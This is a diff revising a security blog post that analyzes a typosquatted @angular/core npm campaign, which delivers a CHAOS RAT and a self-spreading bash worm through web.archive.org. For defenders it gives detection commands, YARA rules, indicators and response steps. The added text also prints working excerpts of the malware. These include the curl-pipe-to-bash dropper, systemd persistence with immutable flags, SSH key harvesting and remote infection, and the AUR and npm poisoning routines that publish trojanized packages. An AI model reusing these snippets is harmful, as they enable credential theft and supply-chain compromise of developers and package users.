@@ -1,67 +1,49 @@
 ---
-title: "An npm worm that hides behind web.archive.org"
-description: "A typosquatted @angular/core clone chains a postinstall hook through the Internet Archive to a CHAOS RAT, then worms across SSH, the AUR and npm. The full chain, the host artifacts to alert on, and two YARA rules."
+title: "One npm Typo, a Tor C2, and a Worm: Analyzing the @angular/core Typosquat Campaign"
+description: "A typosquatted @angular/core clone chains a postinstall hook through the Internet Archive to a CHAOS RAT, then worms across SSH, the AUR and npm. The full chain, the host artifacts to alert on, and YARA rules."
 pubDate: 2026-10-07
+updatedDate: 2026-10-08
 tags: [npm, Supply Chain, Malware, Linux, Detection, YARA]
 ---
 
-This campaign starts with a typo in `npm install`.
+One typo in `npm install` is the entire initial-access budget this campaign needs. An npm account named `anfular` published 25-plus lookalikes of `@angular/core` and `@angular/cli`, every live one versioned `22.2.1` to match the real Angular release and carrying the real package descriptions. Install one by accident and a postinstall hook pulls a dropper through the Internet Archive, which pulls a bash worm, which installs a Go remote access trojan that hides its command-and-control (C2) server behind Tor, then spreads through your SSH keys, your AUR packages, and any npm project on your disk.
 
-<div style="display:flex;flex-wrap:wrap;gap:16px;margin:0 0 2.2em;">
-  <div style="flex:1 1 260px;min-width:0;padding:22px 24px;background:#11151E;border:1px solid #2C3546;border-radius:14px;">
-    <div style="color:#7F8A9C;font-size:14px;margin-bottom:12px;">The real package</div>
-    <div style="font-size:26px;font-weight:700;letter-spacing:-.01em;margin-bottom:18px;word-break:break-word;">@an<span style="color:#5CFF7A;">gu</span>lar/core</div>
-    <div style="color:#C7D0C0;font-size:15px;line-height:1.85;">Scope owned by the Angular team<br>Version 22.2.1<br>Angular - the core framework</div>
-  </div>
-  <div style="flex:1 1 260px;min-width:0;padding:22px 24px;background:#11151E;border:1px solid #FF5D3A;border-radius:14px;">
-    <div style="color:#7F8A9C;font-size:14px;margin-bottom:12px;">The typosquat</div>
-    <div style="font-size:26px;font-weight:700;letter-spacing:-.01em;margin-bottom:18px;word-break:break-word;">@an<span style="color:#FF5D3A;">ug</span>lar/core</div>
-    <div style="color:#C7D0C0;font-size:15px;line-height:1.85;">Scope anyone can register<br>Version 22.2.1<br>Angular - the core framework<br><strong style="color:#fff;">Postinstall hook downloads the dropper</strong></div>
-  </div>
-</div>
+This is a writeup for people who hunt Linux endpoints, review package manifests, or write registry and proxy detections. You'll get the full chain, the actual code from the samples (excerpted, with cuts marked), the host artifacts worth alerting on, and YARA rules I validated against every artifact in the campaign. Nothing I describe was executed. All of it came out of static analysis in gVisor containers, network off, samples mounted read-only.
 
-An npm account named `anfular` published 25-plus lookalikes of `@angular/core` and `@angular/cli`, every live one versioned `22.2.1` to match the real Angular release and carrying the real package descriptions.
+## The front door: typosquats in their own namespace
 
-Install one by accident and this happens:
+Typosquatting is registering a name one edit away from something popular and waiting for fat fingers. The `anfular` account covered the plausible misspellings: `@anuglar/core`, `@angulr/core`, `@anguar/core`, `@anfular/core`. Ten of them for core, ten for cli.
 
-1. A postinstall hook pulls a dropper through the Internet Archive.
-2. The dropper pulls a bash worm.
-3. The worm installs a Go remote access trojan that hides its command-and-control (C2) server behind Tor.
-4. The worm then spreads through your SSH keys, your AUR packages, and any npm project on your disk.
+The mechanic that makes this work on npm is scopes. In `@angular/core`, `angular` is a namespace owned by the Angular team, and only they can publish into it. `@anuglar/core` lives in a different namespace that anyone can register, and to the registry it's an unrelated package that happens to look nearly identical on screen. The fakes even reuse the genuine descriptions, "Angular - the core framework" and "CLI tool for Angular", so a rushed manifest review passes.
 
-This writeup is for people who hunt Linux endpoints, review package manifests, or write registry and proxy detections. It covers the full chain, the host artifacts worth alerting on, and two YARA rules.
+Version choice is the detail I'd aim detection at. Every live fake was published at `22.2.1`, matching the genuine release at the time, so a lockfile diff (the file npm writes to pin the exact versions of everything you install) reads like a routine upgrade instead of a new package appearing. And the placeholders tell you this isn't a one-shot: five more namespaces, `@ahgular`, `@angilar`, `@angullar`, `@angulqr`, and `@anular`, hold core packages at `0.0.0-stage` with the description "Temporary package placeholder for staged publishing". I read those as reserved seats for the next wave, and that placeholder string is a decent registry-wide hunt query on its own.
 
-## Typosquats in their own namespace
+## postinstall, then curl, then bash, with a stop at the Internet Archive
 
-Typosquatting is registering a name one edit away from something popular and waiting for someone to mistype it. The `anfular` account covered the plausible misspellings: `@anuglar/core`, `@angulr/core`, `@anguar/core`, `@anfular/core`. Ten of them for core, ten for cli.
+Each fake package's manifest declares a `postinstall` script, the lifecycle hook npm runs automatically once the tarball lands. This one curls a file the attacker calls `node.js` from a `gitflic.ru` repository, but wrapped in a `web.archive.org` URL (the Internet Archive's Wayback Machine), and pipes it straight into node. Here's the entire file it fetches, all 503 bytes of it:
 
-The two names differ by one swapped pair of letters, and the version and description a reviewer sees are identical.
+```js
+const { exec } = require("child_process");
+const { platform } = require('node:process');
 
-The mechanic that makes this work on npm is scopes. In `@angular/core`, `angular` is a namespace owned by the Angular team, and only they can publish into it. `@anuglar/core` lives in a different namespace that anyone can register, and to the registry it's an unrelated package that happens to look nearly identical on screen.
+if (process.platform === "linux") {
+        exec("curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh | bash", ()=>{});
+} /*else if (process.platform === "win32") {
+        exec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -Command iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/windows.ps1'))", ()=>{});
+}*/
+```
 
-The fakes reuse the genuine descriptions, "Angular - the core framework" and "CLI tool for Angular", so a rushed manifest review passes.
+Two things worth noticing in there. The `platform` import is dead code, and the Windows branch is commented out with an `example.com` placeholder URL, so a Windows port is planned but not finished. The Linux branch is one `exec` of curl piped into bash, fetching `linux.sh` through the same archive trick.
 
-Version choice is the detail I'd aim detection at. Every live fake from this account was published at `22.2.1`, matching the genuine release at the time, so in a lockfile diff the entry looks like the real package unless you read the scope letter by letter.
+The worm's own source confirms the pattern. These are its three payload URLs:
 
-The placeholders suggest more is planned. Five more namespaces hold core packages at `0.0.0-stage` with the description "Temporary package placeholder for staged publishing":
+```bash
+__linux_script_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh'
+__linux_binary_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=systemd-fontd'
+__node_script_url='https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js'
+```
 
-* `@ahgular`
-* `@angilar`
-* `@angullar`
-* `@angulqr`
-* `@anular`
-
-They look like names reserved for later use, and that placeholder string works as a registry-wide hunt query.
-
-The campaign is wider than this one account. OSV lists `@angulra/core` with the same dropper URL but a `preinstall` hook, version 1.0.67 and an unrelated description. On 29 September it also flagged typosquats of express, such as `exptrdd`, that pull a `hellscripter` script from Codeberg through the Wayback Machine in the same way.
-
-## From postinstall to payload, by way of the Internet Archive
-
-Each fake package's manifest declares a `postinstall` script, the lifecycle hook npm runs automatically once the tarball lands. This one curls a file the attacker calls `node.js` (SHA-256 `b4fdaf46a9817f828eb7bc29c9319953a9e06fba2bc2325c972bc25d4ed219d5`) from a `gitflic.ru` repository, wrapped in a `web.archive.org` URL (the Internet Archive's Wayback Machine), and pipes it into node.
-
-That script does one thing: it curls `linux.sh` through the same archive trick and pipes it into bash. A commented-out PowerShell branch sits next to it, so Windows support is planned but not in this build.
-
-So the chain is package, node, bash, payload. Here it is end to end:
+Same archived gitflic.ru path every time. Only the `file=` parameter changes. So the chain is package, node, bash, payload, and it looks like this end to end:
 
 ```mermaid
 sequenceDiagram
@@ -78,73 +60,170 @@ sequenceDiagram
     D->>D: implant, Tor, systemd units
 ```
 
-Every request the victim machine makes goes to `web.archive.org`. That is deliberate. The attacker archived their own files so the download would get past network filters. To a proxy with a domain allowlist, this is traffic to a wayback archive of gitflic raw files.
+Two things to notice. First, every request the victim machine makes goes to `web.archive.org`. To a proxy with a domain allowlist, that's traffic to a research archive, not to a code host fronted by DDoS-Guard. Second, the archived copy is independent of the origin: when I re-fetched all three artifacts on 2026-10-07, they came back byte-identical to my local samples. Taking down the gitflic repository doesn't take down the delivery path. The earliest Wayback capture of the implant is 2026-10-03 04:59 UTC, which is the best first-seen date I have for this chain.
 
-## The payload is CHAOS RAT with a randomized config
+## The implant: a stripped Go RAT with a randomized config
 
-The payload (SHA-256 `4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c7ca7e0`) is a stripped Go ELF, the standard Linux executable format, built from `github.com/tiagorlampert/CHAOS`, an open-source RAT.
+The payload is a 7,581,959-byte stripped ELF (the standard Linux executable format) built with Go 1.27.1 for x86-64, compiled from `github.com/tiagorlampert/CHAOS`, an open-source RAT, with `gorilla/websocket` for the command channel and X11 libraries for screenshots. Stripped means no DWARF debug info, but Go can't strip everything: the runtime still needs `.gopclntab`, a function metadata table, and parsing it gave me 7,850 function names plus their call relationships.
 
-Its config is a base64 JSON blob holding the C2 address, port, and token. The key names are randomized per build, so a signature written on the config strings stops matching as soon as the operator rebuilds. This build points at a Tor v3 hidden service, `lpdt2hbzom3uxxq4dutlnypca3ym5c6h7g6fooi4qgz4m5qpcvrpczid.onion`, on port 80.
+The call chain I care about starts in `main.main`. Here's the disassembly, recovered via `.gopclntab` and decoded with capstone:
 
-The implant never talks to that onion directly. It dials through a Tor SOCKS5 proxy at `127.0.0.1:9050` that the worm installs alongside it, so the host's clearnet traffic never touches the C2. If you're writing network detection for this, destination IOCs won't help. What's observable is a Tor process where nobody installed Tor, and the units that set the proxy up.
+```asm
+; main.main @ 0x6fb300
+0x6fb30e: mov rax, qword ptr [rip + 0x43309b]   ; config slice .ptr
+0x6fb315: mov rbx, qword ptr [rip + 0x43309c]   ; config slice .len
+0x6fb31c: mov rcx, qword ptr [rip + 0x43309d]   ; config slice .cap
+0x6fb323: call utils.ReadConfigFile
+0x6fb34d: call ui.ShowMenu                      ; menu title "CHAOS (%s)"
+0x6fb36e: call environment.Load                 ; ServerAddress, ServerPort, mode
+```
 
-Persistence has a root and a non-root variant, both named like font services.
+Those three `mov` instructions load a byte slice out of `.data`, at 0xb2e3b0, pointing at a 356-byte blob at 0xaee506, and hand it to `utils.ReadConfigFile`, which base64-decodes it and unmarshals it as JSON. The recovered logic, paraphrased:
 
-**Root:** the implant lands at `/usr/lib/systemd/systemd-fontrenderd`, with a unit at `/etc/systemd/system/systemd-fontrenderd.service` described as "Font Rendering Service". The worm then sets `chattr +i` on the binary and the unit, so an admin who spots them can't delete them without clearing the immutable flag first.
+```go
+cfg := utils.ReadConfigFile(configBlob) // .data slice @ 0xb2e3b0 -> 356 bytes @ 0xaee506
+ui.ShowMenu("dev", ...)
+env := environment.Load(cfg.ServerAddress, cfg.ServerPort, cfg.Mode)
+app.New(env).Run()
+```
 
-**Non-root:** a Tor expert bundle unpacks under `~/.config/systemd/systemd-fontrenderd/`, the implant goes to `~/.config/systemd/systemd-fontcached`, and matching user units enable both at login.
+The decoded config looks like this. I'm eliding the token; it's auth material with no grep value, and its expiry is 2027-10-03:
 
-Capabilities are the standard CHAOS set: remote shell through `sh -c`, file upload, download, and delete, X11 screenshots, device fingerprinting, power control, and `xdg-open` for URLs.
+```json
+{
+  "UWi4wFtL9j": "80",
+  "qG8ut5UyEA": "lpdt2hbzom3uxxq4dutlnypca3ym5c6h7g6fooi4qgz4m5qpcvrpczid.onion",
+  "z3qujLWM7W": "<HS256 JWT, elided>"
+}
+```
 
-## The worm spreads over SSH, the AUR and npm
+Those JSON keys are meaningless on purpose, and they're randomized per build. I confirmed the mapping (port, address, token) from the struct-field order in the `environment.Load` disassembly, not from the strings. That's the defensive lesson in one detail: any signature written on the config, the key names, the onion address, the token, dies the moment the operator rebuilds.
 
-The bash worm, `linux.sh` (SHA-256 `b1a1429d4af8af4384d546b4544ddf5db4bcbb48bec0c58aadd1b5973f42617b`), handles propagation. The RAT compromises one machine, and this script is what carries it to others.
+The implant never talks to that onion directly. It dials through a Tor SOCKS5 proxy at `127.0.0.1:9050` that the worm installs alongside it, so the host's clearnet traffic never touches the C2. If you're writing network detection for this, destination IOCs are worthless. What's observable is a Tor process where nobody installed Tor, and the units that set the proxy up. For sensor writers, the protocol surface on the C2 side is plain HTTP and WebSocket:
 
-First, credentials. It harvests every SSH private key under `/home/*`, `/root`, and `/mnt/c/Users/*`, so WSL (Windows Subsystem for Linux) setups are included. It merges every `known_hosts` on the box, tries each key against each host, and on success runs the same `curl | bash` there. One developer machine with a shared key can spread it across an internal network.
+```text
+GET  http://<c2>/<endpoint>/    availability poll (handler.ServerIsAvailable)
+POST http://<c2>/<endpoint>/    device specs: hostname, username, mac_address, local IP
+WS   ws://<c2>/<endpoint>/     command channel, auto-reconnect
+Authorization: Bearer <HS256 JWT, user "default">
+```
 
-Then it attacks the two supply chains the victim participates in.
+Capabilities are the standard CHAOS set, confirmed from recovered function names: remote shell through `exec.Command("sh", "-c", cmd)`, file explorer with upload, download, and delete, X11 screenshots, device fingerprinting (hostname, username, MAC, and local IP, the last one discovered with a UDP dial to `8.8.8.8:80`), power control, and `xdg-open` for URLs. There's even a leftover menu stub titled `CHAOS (%s)`, and dormant Windows code paths like `Rundll32.exe user32.dll,LockWorkStation`.
 
-On the AUR (Arch User Repository):
+## The worm: fake font services, then three roads out
 
-* It lists the victim's packages.
-* It appends `bash <(curl -L <linux.sh>)` to each package's `post_install` hook.
-* It bumps `pkgrel` (the PKGBUILD's release number).
-* It pushes an `upgpkg:` commit under the maintainer's own git identity.
+The 7,170-byte bash script is where I spent most of my time. It installs its own toolchain first, as root (`pacman -Syu --needed tor openssh git npm base-devel` on Arch, apt equivalents on Debian), then makes itself at home. If it has root:
 
-On npm:
+```bash
+__deploy_fontrenderd() {
+  systemctl enable --now tor.service
+  curl -L "$__linux_binary_url" -o /usr/lib/systemd/systemd-fontrenderd
+  chmod +x /usr/lib/systemd/systemd-fontrenderd
+  chattr +i /usr/lib/systemd/systemd-fontrenderd
+  # … writes the unit file, enables it, then:
+  chattr +i /etc/systemd/system/systemd-fontrenderd.service
+  chattr +i /etc/systemd/system/multi-user.target.wants/systemd-fontrenderd.service
+}
+```
 
-* It walks every `package.json` on disk outside `node_modules`.
-* It prepends `curl -L <node.js> | node` to the postinstall.
-* It bumps the patch version.
-* It publishes with every `.npmrc` it can find.
+The binary name, `systemd-fontrenderd`, is chosen to sit next to real systemd internals. The unit file it writes:
 
-The last step of the npm branch hides the change. After publishing, it restores the original `package.json`. The working tree looks unchanged while the registry serves the trojanized version, and the only trace is a patch-version bump.
+```ini
+# /etc/systemd/system/systemd-fontrenderd.service
+[Unit]
+Description=Font Rendering Service
+Wants=tor.service
+After=tor.service
+
+[Service]
+Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
+ExecStart=/usr/lib/systemd/systemd-fontrenderd
+KillMode=none
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Read that as a detection spec: a service nobody ordered, wanting `tor.service`, injecting a SOCKS5 proxy into the environment, and setting `KillMode=none` so systemd leaves the process alone. The `chattr +i` calls mean even an admin who spots it can't delete it without clearing the immutable flag first. Without root, the same layout moves under `~/.config/systemd/`: the implant at `~/.config/systemd/systemd-fontcached`, a Tor expert bundle (i686, version 15.0.24, fetched through the Wayback Machine from `dist.torproject.org`, an i686 Tor next to an amd64 implant, so the author hardcoded one URL and moved on) under `~/.config/systemd/systemd-fontrenderd/`, and user units enabling both at login.
+
+Then it looks for keys. This is the entire private-key discovery step, WSL paths included:
+
+```bash
+for __key in $(file {/home/*,/root,/mnt/c/Users/*}/.ssh/** | grep -F "OpenSSH private key" | cut -d":" -f1)
+```
+
+It merges every `known_hosts` on the box, then tries each key against each host, through every ssh config it can find, plus an explicit root attempt:
+
+```bash
+for __host in $(cut -d' ' -f1 "$__known_hosts" | sort -u); do
+  for __config in /home/*/.ssh/config /etc/ssh/ssh_config /mnt/c/Users/*/.ssh/config /root/.ssh/config; do
+    __infect_host -F "$__config" -i "$1" "ssh://$__host" &
+  done
+  __infect_host -l root -i "$1" "ssh://$__host" &
+done
+
+__infect_host() {
+  # … connect, check uname …
+  __ssh $@ "nohup curl -L '$__linux_script_url' | nohup bash >/dev/null 2>&1"
+}
+```
+
+One developer machine with a shared key can seed an internal network. Then it attacks the two supply chains the victim participates in. On the AUR (Arch User Repository), for every package the victim maintains:
+
+```bash
+__do_aur_update() {
+  # … clone ssh://aur@aur.archlinux.org/$1.git, source PKGBUILD …
+  ((pkgrel++))
+  printf '\n%s\n' "bash <(curl -L '$__linux_script_url')" >> "$install"
+  sed -E -i "s/pkgrel = [0-9]+/pkgrel = $pkgrel/" .SRCINFO
+  git config user.email "$(git log -1 --pretty=format:'%ae')"
+  git config user.name  "$(git log -1 --pretty=format:'%an')"
+  git commit -m "upgpkg: $__fullpkgver" -a --no-gpg-sign
+  # … git push with random-backoff retries …
+}
+```
+
+It bumps `pkgrel` (AUR's package revision counter), appends a `post_install` hook to the package's `.install` file, and commits with the `upgpkg:` prefix using the maintainer's own identity, pulled from the last commit's author fields. To anyone reading AUR history, it's routine maintenance.
+
+On npm, for every `package.json` on disk outside `node_modules`:
+
+```bash
+__do_npm_update() {
+  local __postinstall="$(npm pkg get scripts.postinstall)"
+  [ -n "$__postinstall" ] && local __postinstall+=' & '
+  local __postinstall+="curl -L $__node_script_url | node"
+  npm pkg set scripts.postinstall="$__postinstall"
+  npm --no-git-tag-version version patch
+  for NPM_CONFIG_USERCONFIG in {/home/*,.,/mnt/c/Users/*,/root}/.npmrc "$PREFIX/etc/npmrc"; do
+    export NPM_CONFIG_USERCONFIG; npm publish &
+  done
+  wait
+  mv -f "$__package_json_orig" package.json   # put the original back
+}
+```
+
+Read the last line twice. It chains its own curl after your existing postinstall with an `&`, bumps the patch version, publishes to every registry configuration it can find, then moves the saved original `package.json` back into place. Your working tree shows nothing. The registry serves the trojanized version, and the only trace is a patch bump nobody made.
 
 ```mermaid
 flowchart TD
     I[Infected host] --> S["SSH: harvested keys, known_hosts replay"]
     I --> A["AUR: pkgrel bump, post_install hook"]
     I --> N["npm: postinstall, patch bump, publish"]
-    S --> V["New host runs linux.sh"]
-    A --> V
-    N --> V
-    V --> F["Same artifacts: fontrenderd and fontcached units, Tor on 127.0.0.1:9050, chattr +i"]
-    F -.->|"becomes the next infected host"| I
+    S --> H1["Peer hosts infected"]
+    A --> H2["AUR users infected"]
+    N --> H3["npm users infected"]
+    H1 --> I
+    H2 --> I
+    H3 --> I
 ```
 
-All three branches end on a new host with the same artifacts: the fontrenderd and fontcached units, the local Tor proxy, the immutable flags. Every infection leaves the same files however it arrived, so detection should target those.
+Notice what the diagram is really saying: all three branches converge on the same host artifacts, the fontrenderd and fontcached units, the local Tor proxy, the immutable flags. You can't watch every road in. Every road out lands in the same place, so that's where the detection goes.
 
-In MITRE ATT&CK terms, this maps to:
+For the ATT&CK-minded, this maps to T1195.002 for the supply-chain branches, T1552.004 for the key harvest, T1021.004 for the SSH spread, T1543.002 for the systemd persistence, and T1090.003 for the Tor routing.
 
-* T1195.002 for the supply-chain branches
-* T1552.004 for the key harvest
-* T1021.004 for the SSH spread
-* T1543.002 for the systemd persistence
-* T1090.003 for the Tor routing
+## Detection: build for the next build, not this one
 
-## Detect what survives a rebuild
-
-The build-specific indicators (the onion address, the JWT, the config key names, the base64 blob) change with every rebuild, so they make poor detections.
+The build-specific indicators, the onion address, the JWT, the config key names, the base64 blob, won't survive a rebuild. Don't write detections on them. The stable surface splits in two: the implant still has to carry CHAOS's package paths in `.gopclntab` and its protocol strings, and the worm still has to write its service names and call its own functions.
 
 On a host, four commands cover most of it:
 
@@ -161,27 +240,26 @@ lsattr /etc/systemd/system/systemd-fontrenderd.service /usr/lib/systemd/systemd-
 An `i` in the attribute column is the `chattr +i` persistence.
 
 ```bash
-pgrep -a tor; ss -ltnp | grep ':9050'
+pgrep -a tor; ss -tp | grep -i tor
 ```
 
-A Tor process and a listener on the SOCKS port, on a host that shouldn't have either.
+A Tor process on a box where nobody installed Tor. The user-mode variant runs with the expert bundle's `torrc-defaults`, so `pgrep -af 'tor.*torrc-defaults'` is the tighter match.
 
 ```bash
-grep -rlE 'curl.*(gitflic|web\.archive)' --include=package.json --include='*.install' --exclude-dir=node_modules . 2>/dev/null
+grep -rlE 'curl.*(gitflic|web\.archive)' --include=package.json --include='*.install' . 2>/dev/null
 ```
 
 postinstall and post_install poisoning in anything you or your team maintain.
+
+In code review, the signatures are a patch-version bump with no functional change and a postinstall that grew a `& curl … | node` tail; on AUR, an `upgpkg:` commit whose `.install` gained a `post_install` hook that wasn't there in the previous revision.
 
 For scanning samples, these are the two rules I run, both validated against the campaign artifacts:
 
 ```yara
 rule CHAOS_RAT_Linux_Client {
     meta:
-        family      = "CHAOS RAT (Go client)"
-        author      = "static analysis, gVisor lab"
-        date        = "2026-10-05"
-        reference   = "github.com/tiagorlampert/CHAOS client (devel), Go 1.27.1 linux/amd64"
-        note        = "matches unmodified builds regardless of baked C2 config"
+        family = "CHAOS RAT (Go client)"
+        note   = "matches unmodified builds regardless of baked C2 config"
 
     strings:
         $pkg1 = "github.com/tiagorlampert/CHAOS/client/app/services/" ascii
@@ -204,15 +282,18 @@ rule CHAOS_RAT_Linux_Client {
 }
 ```
 
-In the condition, `uint32(0) == 0x464c457f` is the ELF magic in the first four bytes, the size gate keeps the 7KB droppers from matching, and `3 of ($pkg*)` tolerates a rebuild that drops one package path.
+The condition does the work: `uint32(0) == 0x464c457f` is the ELF magic in the first four bytes, the size gate keeps the 7KB droppers from matching, and `3 of ($pkg*)` tolerates a rebuild that drops one package path. Requiring the Go buildinfo string plus CHAOS-specific package paths is what keeps this off ordinary Go binaries. Saved as `CHAOS_RAT_Linux_Client.yar`, run it against anything suspicious:
+
+```bash
+yara CHAOS_RAT_Linux_Client.yar suspect-file
+```
 
 The second rule matches the worm, and it's the one I'd point at npm tarballs and AUR checkouts:
 
 ```yara
 rule CHAOS_Dropper_Linux_Worm {
     meta:
-        family      = "CHAOS RAT dropper - fontrenderd worm (bash)"
-        note        = "AUR/npm supply-chain + SSH worm + Tor persistence"
+        family = "CHAOS RAT dropper - fontrenderd worm (bash)"
 
     strings:
         $svc1  = "systemd-fontrenderd" ascii
@@ -239,17 +320,9 @@ rule CHAOS_Dropper_Linux_Worm {
 }
 ```
 
-The three "2 of" clauses mean a partial rework of the script still matches, as long as the service names, the worm's own function names, and the infrastructure strings survive.
+The three "2 of" clauses mean a partial rework of the script still matches, as long as the service names, the worm's own function names, and the infrastructure strings survive. Two more rules in the set cover the embedded base64 config layout and the 503-byte node dropper; the config one anchors its base64 regex on the `ServerPort`, `ServerAddress`, and `*environment.Configuration` type strings, which is what keeps it quiet on unrelated Go builds.
 
-If you find it, respond in this order:
-
-1. Capture `~/.config/systemd/systemd-fontrenderd/` and both unit files as evidence.
-2. Run `chattr -i` on the binaries and units, then remove them.
-3. Run `systemctl daemon-reload` and `systemctl --user daemon-reload`.
-4. Rotate every SSH key that was on the host, because you assume all of them were read.
-5. Check every host in the merged `known_hosts` for the same artifacts.
-
-AUR maintainers should review everything pushed since early October. npm publishers should revoke tokens and diff the registry's copy of each package against the local one, because the worm restored the local copy on purpose.
+The response order if you find it: capture `~/.config/systemd/systemd-fontrenderd/` and both unit files as evidence first, then `chattr -i` and remove the binaries and units, then `systemctl daemon-reload` and `systemctl --user daemon-reload`. After that, rotate every SSH key that was on the host, because you assume all of them were read, and check every host in the merged `known_hosts` for the same artifacts. AUR maintainers should review everything pushed since early October. npm publishers should revoke tokens and diff the registry's copy of each package against the local one, because the worm restored the local copy on purpose.
 
 ## Indicators
 
@@ -305,3 +378,9 @@ Placeholder core packages, version `0.0.0-stage`, description "Temporary package
 @angulqr/core
 @anular/core
 ```
+
+## The takeaway
+
+The structural lesson for me is the Wayback hop, not the typosquat. Typosquat packages tend to get reported and pulled quickly; the delivery path is a URL pattern that outlives the origin. If your egress policy treats `web.archive.org` as trusted, one attacker URL walks a RAT straight through it. Blocking the domain outright breaks legitimate archive fetches, so the trade-off is real. Monitoring it costs far less than blocking it, and that's the side I'd pick.
+
+And run the greps. If you maintain AUR packages or publish to npm, check your last `upgpkg:` commit and your last patch bump today. The npm branch of this worm restores your `package.json` after publishing, so a clean working tree proves nothing.
